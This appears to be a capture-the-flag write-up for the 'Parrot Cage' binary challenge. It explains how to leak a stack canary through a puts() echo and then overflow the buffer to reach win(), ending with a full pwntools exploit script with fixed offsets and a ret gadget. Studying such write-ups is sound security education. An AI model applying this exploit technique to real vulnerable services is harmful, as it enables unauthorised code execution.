## Parrot Cage - ret2win with Canary Leak via puts Echo

`vuln()` in this challenge contains both the leak primitive and the overflow primitive inside the same loop, which makes exploitation possible in exactly two rounds: the first send leaks the canary through the `puts()` echo, and the second send delivers the overflow with the canary correctly restored.

### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with canary bypass achieved by leaking the canary's 7 non-null bytes through the `puts()` echo in `vuln()`. The artifacts provided are the `parrot_cage` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win with canary leak because `vuln()` calls `puts(buf)` to echo user input back to the caller, and since the canary on x86-64 always begins with a null byte, overwriting exactly that null byte with a non-null fill character causes `puts()` to print past the canary boundary and expose the remaining 7 random bytes, from which the full canary can be reconstructed and then placed intact in the second overflow.

### Phase 1 - Reconnaissance & Enumeration

```bash
checksec --file ./parrot_cage
```

|Protection|Status|Implication|
|---|---|---|
|Canary|✅ Enabled|A canary sits between `buf` and saved RIP and must be correctly restored in the overflow payload; its value is recovered in round 1 via the `puts()` echo|
|NX|✅ Enabled|Shellcode injected into `buf` cannot execute, so the only viable target is the existing `win()` function; the `ret` gadget at `0x000000000040101a` is also needed for 16-byte stack alignment|
|PIE|❌ Not found|`win()` has a fixed virtual address that `exe.sym.win` resolves at load time, and `GADGET` is a static address requiring no leak|
|RELRO|Partial|GOT entries are writable, but no GOT overwrite is necessary for this exploit|

Reading `main.c` shows that `vuln()` declares a `char buf[64]` on the stack and enters an infinite loop, where each iteration calls `read(STDIN_FILENO, buf, 0x200)`, which reads up to 512 bytes into the 64-byte buffer, and then calls `puts(buf)`, which echoes the buffer content back to stdout. The loop exits only when `read()` returns 0 or when the first three bytes of the input are `'b'`, `'y'`, `'e'`.

### Phase 2 - Vulnerability Identification

Two vulnerabilities are chained here, and each serves a distinct role. The first is an information leak: `puts(buf)` in `vuln()` prints from `buf[0]` until it encounters a null byte, and since the canary on x86-64 is always stored in memory with its least-significant byte (which is always `\x00`) at the lowest address, sending exactly 73 bytes (72 fill bytes followed by one non-null byte) overwrites that leading null byte and causes `puts()` to continue printing past the canary, exposing the 7 remaining random bytes. The second vulnerability is the overflow itself: `read(STDIN_FILENO, buf, 0x200)` reads up to 512 bytes into a 64-byte `char buf[64]`, which is enough to overwrite the canary, saved RBP, and saved RIP in a single call. Since both primitives are reachable on consecutive iterations of the same loop, the exploit can leak first and then overflow in the very next send, without ever reconnecting.

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Stack buffer overflow in vuln() with canary leak via puts() echo
GOAL: Redirect saved RIP to win() and have it print the flag via getenv("FLAG")
APPROACH:
  Step 1: Send 73 bytes (72 b'A' bytes to reach the canary + 1 non-null byte to overwrite its leading null) so puts() prints past the canary boundary
  Step 2: Parse the echoed line: bytes at index [73:80], left-padded to 7 bytes with \x00 if puts() stopped early, are the upper 7 bytes of the canary; prepend \x00 to reconstruct the full 8-byte value
  Step 3: Send a 104-byte payload: 72 b'A' bytes to reach the canary, p64(canary) to restore it, 8 b'B' bytes to fill saved RBP, p64(GADGET) for 16-byte stack alignment, and p64(exe.sym.win) to overwrite saved RIP
TOOLS: pwntools, GDB + pwndbg
RISK OF FAILURE: if the recovered canary bytes contain an embedded null, puts() stops early and the ljust(7) padding must compensate correctly; incorrect OFFSET_TO_CANARY shifts every subsequent write
```

### Phase 4 - Exploit Development

#### Reading the Frame Layout from the Disassembly

Disassembling `vuln()` in GDB reveals the two instructions that fix the frame layout completely:

```
sub rsp, 0x60              ← total frame is 0x60 = 96 bytes
mov qword ptr [rbp - 0x08], <canary>   ← canary stored at rbp−0x08
```

Combined with the fact that `buf` is declared as `char buf[64]` and the compiler places it at `rbp − 0x50`, the full layout is:

```
rbp − 0x50  →  buf[0]      (64 bytes)
rbp − 0x10  →  (8 bytes padding)
rbp − 0x08  →  canary      (8 bytes)
rbp + 0x00  →  saved RBP   (8 bytes)
rbp + 0x08  →  saved RIP   ← target
```

The offset from `buf[0]` to the canary is `0x50 − 0x08 = 0x48 = 72`, giving `OFFSET_TO_CANARY = 72`. The offset from `buf[0]` to saved RIP is `72 + 8 + 8 = 88`, giving `OFFSET_TO_RIP = 88`.

#### Leaking the Canary via the puts() Echo

Sending `b'A' * 73` (72 bytes to fill `buf[0..71]` plus one non-null byte to overwrite the canary's null LSB) causes `puts()` to continue printing past the overwritten position. The echoed line is then parsed as follows: everything from index 73 onward is the raw canary body, left-padded to 7 bytes with `\x00` to account for any embedded nulls that caused `puts()` to stop prematurely, and the known leading `\x00` is prepended to form the full 8-byte canary value:

```python
canary_bytes = leaked[OFFSET_TO_CANARY + 1:].ljust(7, b'\x00')[:7]
canary       = u64(b'\x00' + canary_bytes)
```

#### Building the Final Overflow Payload

With the canary recovered, the second send overwrites the stack in the exact order dictated by the frame layout: 72 `b'A'` bytes to reach the canary slot, `p64(canary)` to restore it intact so the check passes, 8 `b'B'` bytes to fill saved RBP, `p64(GADGET)` with the `ret` gadget at `0x000000000040101a` to maintain 16-byte stack alignment before the call inside `win()`, and finally `p64(exe.sym.win)` to redirect execution.

#### Known Values Summary

|What|Value|
|---|---|
|`OFFSET_TO_CANARY`|72 (`0x48`)|
|`OFFSET_TO_RIP`|88 (`0x58`)|
|`GADGET` (`ret`, stack alignment)|`0x000000000040101a`|
|`win()` address|`exe.sym.win` (static, resolved at load time)|

### The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./parrot_cage')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    r.recvuntil(b"bye' when you're done chatting.")
    r.recv(timeout=0.2)

    # ── leak phase ────────────────────────────────────────────────────────────
    r.send(b'A' * (OFFSET_TO_CANARY + 1))

    leaked       = r.recvline(drop=True)
    canary_bytes = leaked[OFFSET_TO_CANARY + 1:].ljust(7, b'\x00')[:7]
    canary       = u64(b'\x00' + canary_bytes)
    log.success(f'canary = {canary:#x}')

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```